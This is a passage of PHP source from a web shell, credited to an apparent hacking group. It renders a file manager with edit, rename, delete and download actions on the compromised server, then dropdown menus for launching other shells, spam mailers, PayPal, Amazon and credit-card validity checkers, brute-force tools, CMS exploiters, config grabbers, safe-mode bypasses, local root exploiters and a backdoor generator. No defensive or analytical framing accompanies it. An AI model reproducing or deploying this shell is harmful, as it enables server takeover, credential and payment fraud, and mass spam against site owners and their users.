            echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
            echo "<td class='td_home'><center>$ftype</center></td>";
            echo "<td class='td_home'><center>$size</center></td>";
            echo "<td class='td_home'><center>$ftime</center></td>";
            echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
            echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
        }
        echo "</tr></table>";
    } else {
        echo "<font color=red>can't open directory</font>";
    }
    }
echo "<center><hr><form>
<select onchange='if (this.value) window.open(this.value);'>
   <option selected='selected' value=''> Tools Creator </option>
   <option value='$ling=wso'>WSO 2.8.1</option>
   <option value='$ling=injection'>1n73ction v3</option>
   <option value='$ling=tmpshell'>Tmp shell</option>      
   <option value='$ling=dhanus'>Dhanush Shell</option>     
   <option value='$ling=r57'>R57 Shell</option>    
   <option value='$ling=encodedecode'>Encode Decode</option>    
   <option value='$ling=uploader'>Uploader</option>
   <option value='$ling=be74k'>b374k Shell</option>
   <option value='$ling=merica'>Shell Merica</option>
   <option value='$ling=act'>Act Shell V.1</option>
   <option value='$ling=brudul'>Brudul Shell</option>
   <option value='$ling=minishell'>Mini Shell</option>
   <option value='$ling=idx'>Shell IndoXploit V.3 1</opiton>
   <option value='$ling=badcode'>Shell Badcode</option>
   <option value='$ling=noname'>Shell NONAME</option>
   <option value='$ling=terserah'>Terserah shell</option>
   <option value='$ling=1337cpcrack'>1337 Cp Crack</option>
   <option value='$ling=md5cheker'>MD5 CHECKER</option>        
</select>


<select onchange='if (this.value) window.open(this.value);'>
   <option selected='selected' value=''> Tools Spammer </option>
   <option value='$ling=promailerv2'>Pro Mailer V2</option>     
   <option value='$ling=tokenpp'>Paypal Token Generator</option>  
   <option value='$ling=mailer'>Mailer</option>
   <option value='$ling=mailersender'>Mailer Mass send V.2 </option>
   <option value='$ling=bsm'>Black Space Mailer </option>
   <option value='$ling=priv8'>priv 8 Tools</option> 
   <option value='$ling=cccheker'>Online credit card validator </option>
   <option value='$ling=ppcheker'>PayPal Valid Email Checker [ Fresh ] </option>
   <option value='$ling=amazoncheker'>[ $ ] AmazOn Valid Checker [ $ ]</option>
   <option value='$ling=ppemail'>Paypal Email Valid checker</option>
   <option value='$ling=smtp'>Priv8 Smtp & Other Setup</option>
   <option value='$ling=hotmailinbox'>Hotmail inbox</option>
   <option value='$ling=MassMailerbyF4jzar-xCyb3r207'>Mass Mailer by F4jzar-xCyb3r207</option>
   <option value='$ling=MassMaillerInbox'>Mass Mailler Inbox</option>
   <option value='$ling=EmailFilter'>Email Filter</option>
   <option value='$ling=amazonemailchecker'>AMAZON Email Checker</option>
   <option value='$ling=ebayemailchecker'>EBay Email Checker</option>
   <option value='$ling=databaseemailsextractor'>Database Emails Extractor</option>
   <option value='$ling=bukalapakaccountchecker'>BukaLapak Account Checker</option>
   <option value='$ling=tokopediachecker'>Tokopedia Checker</option>


   
</select>
<select onchange='if (this.value) window.open(this.value);'>
    <option selected='selected' value=''> Tools Exploiter </option>
    <option value='$ling=fileuploadphpmyadmin'>Auto File Upload phpMyAdmin</option>
    <option value='$ling=MagentoCMSBruteForceAdminLogin'>Magento CMS BruteForce Admin Login</option>
    <option value='$ling=CSRFXploiterOnline'>CSRF Xploiter Online</option>
    <option value='$ling=WordPressU-DesignThemesUploadifyDorker'>WordPress U-Design Themes Uploadify Dorker</option>
    <option value='$ling=ShellShockXploiter'>ShellShock Xploiter (WebBased)</option>
    <option value='$ling=ShellShockAutoXploitReverseShell'>ShellShock Auto Xploit & Reverse Shell</option>
    <option value='$ling=WebdavMassXploiterIP'>Webdav Mass Xploiter IP</option>
    <option value='$ling=POPOJICMSAddAdminAutoRegistration'>POPOJI CMS Add Admin Auto Registration</option>
    <option value='$ling=SQLDorkScannerviaBingDorker'>SQL Dork Scanner via Bing Dorker [ Web ]</option>
    <option value='$ling=PrestashopModulesBlocktestimonialFileUpload'>Prestashop Modules Blocktestimonial File Upload</option>
    <option value='$ling=WebConsole'>WebConsole</option>
    <option value='$ling=LocalRootExploiter'>Local Root Exploiter by Makman ( No BackConnect )</option>
    <option value='$ling=binchecker'>Bin Checker</option>
    <option value='$ling=drupalcore'>Drupal core 7.x</option>
    <option value='$ling=krimou'>KrimOu CPanel Cracker Script & Root Server</option>
    <option value='$ling=massrevslider'>Mass Revslider Exl0it1ng</option>
    <option value='$ling=extract'>Extract Emails From WordPress–Joomla–OpenCart–WHMCS</option>
    <option value='$ling=reverseiplookup'>Reverse Ip Lookup Domain</option>
    <option value='$ling=safemode'>Bypass SafeMode</option>
    <option value='$ling=symlinkbased'>Symlink Based cPanel</option>
    <option value='$ling=ConfigWordpressandJoomlaGrabber'>Config Wordpress and Joomla Grabber</option>
    <option value='$ling=WP2'>WP2</option>
    <option value='$ling=autocreatesudomain'>auto create sudomain</option>
    <option value='$ling=MiniMassAutoXploiterOnlyToolsv1.0'>Mini Mass Auto Xploiter Only Tools v1.0</option>
    <option value='$ling=SCANSERVER'>SCAN SERVER</option>
    <option value='$ling=ownLFI|t00lkitv1.0'>ownLFI| t00lkit v1.0 | By Asesino04</option>
    <option value='$ling=PHPInfo'>PHP Info</option>
    <option value='$ling=m0bil3xTSQLiScanner'>m0bil3_xT's SQLi Scanner</option>
    <option value='$ling=ExploitsWordpressLFD'>Exploits Wordpress LFD</option>
    <option value='$ling=xSec-BackDoorGenerator'>xSec-BackDoor Generator [ Create Your Own Backdoor ]</option>
    <option value='$ling=Bypass[LiteSpeed-Nginx-Apache]'>Bypass [ LiteSpeed - Nginx - Apache ] By b0x</option>
    <option value='$ling=UploadFileUsingfile_get_contents'>Upload File Using file_get_contents</option>
    <option value='$ling=ProxyByRoot'>Proxy By Root</option>
    <option value='$ling=ReadFileUsing3Function>Read File Using 3 Function 1</option>
    <option value='$ling=MySQLQueryCommandExecute'>MySQL Query Command Execute</option>
    <option value='$ling=CreateHtaccess'>Create Htaccess</option>
    <option value='$ling=SimpleBypasser'>Simple Bypasser [ fopen + file_get_contents ]</option>
    <option value='$ling=SearchForBlindSQLInjectionvBulltein'>Search For Blind SQL Injection vBulltein By List</option>
    <option value='$ling=GetallSite'>Get all Site Server</option>
    <option value='$ling=ScannerSh3LL'>Scanner Sh3LL'z & Dir'z</option>
    <option value='$ling=BypassSuPHPVersion2[Sfa7trick]'>Bypass SuPHP Version 2 [ Sfa7 trick ]</option>
    <option value='$ling=ExtractUsersFromPasswd'>Extract Users From Passwd</option>
    <option value='$ling=BypassMethodNotimplemented'>Bypass Method Not implemented</option>
    <option value='$ling=GetWordpressUser'>Get Wordpress User</option>
    <option value='$ling=WordpressKiller'>Wordpress Killer</option>
    <option value='$ling=3mlaqGamesExploitByxSecurity'>3mlaq Games Exploit</option>
    <option value='$ling=ExtractEmails'>Extract Emails From OpenCart CMS</option>
    <option value='$ling=SearchForExploitViaExploit-DB'>Search For Exploit Via Exploit-DB</option>
    <option value='$ling=Extract[id-username-password-salt-email]'>Extract [id-username-password-salt-email]</option>
    <option value='$ling=GetToolsFromYourAppServ'>Get Tools From Your AppServ</option>
    <option value='$ling=Checkingjoomla1.6-1.7Registration'>Checking joomla 1.6 - 1.7 Registration</option>
    <option value='$ling=LoginFormWithSESSIONWithoutConnectToDatabase'>Login Form With SESSION Without Connect To Database</option>
    <option value='$ling=GenerateXMLPluginvBulletin[ajax.php]'>Generate XML Plugin vBulletin [ ajax.php ]</option>
    <option value='$ling=RCIJoomlaExploitPHPVersion'> RCI Joomla Exploit PHP Version</option>
    <option value='$ling=KleejaXMLPluginGenerator'>Kleeja XML Plugin Generator</option>
    <option value='$ling=JoomlaBruteForce'>Joomla Brute Force</option>
    <option value='$ling=4imagesBruteForce'>4images Brute Force</option>
    <option value='$ling=BruteForceAllWordpressOnServer'>Brute Force All Wordpress On Server</option>
    <option value='$ling=SkypeBruteForcePHPVersion'>Skype Brute Force PHP Version</option>
    <option value='$ling=twitterbruteforce'>Twitter Brute Force</option>
    <option value='$ling=Ask.FmBruteForceByxSecurity'>Ask.Fm Brute Force</option>
    <option value='$ling=DimofinfBruteForce'>Dimofinf Brute Force</option>
    <option value='$ling=grabbersqlisitesfromip'>grabber sqli sites from ip</option>
    <option value='$ling=ProtectFolderViaHtaccess'>Protect Folder Via Htaccess</option>
    <option value='$ling=AddHttp'>Add Http:// to sites</option>
    <option value='$ling=WordPressNativeChurchthemeLFIscanner'>WordPress NativeChurch theme LFI scanner</option>
    <option value='$ling=kumpulanlocalroot'>Kumpulan LocalRoot Exploiter</option>
    <option value='$ling=allbypass'>All Bypasser</option>




</select>   
<noscript><input type='submit' value='Submit'></noscript>
</form>Copyright &copy; ".date("Y")." - <b><a href='http://www.anoncyberteam.org/' target='_blank'><font size='3' color=00ffd2>www.anoncyberteam.org</font></a><b> </center>";
?>
